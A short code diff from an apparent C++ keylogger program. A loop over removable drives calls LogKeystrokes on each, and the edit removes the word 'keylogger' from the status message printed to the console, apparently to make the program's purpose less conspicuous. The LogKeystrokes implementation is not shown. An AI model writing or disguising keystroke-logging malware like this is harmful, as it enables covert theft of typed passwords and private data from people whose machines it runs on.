@@ -45,7 +45,7 @@ int main() {
     }
 
     for (const auto& drive : removableDrives) {
-        std::cout << "Starting keylogger on drive " << drive << std::endl;
+        std::cout << "Starting on drive " << drive << std::endl;
         LogKeystrokes(drive);
     }
 
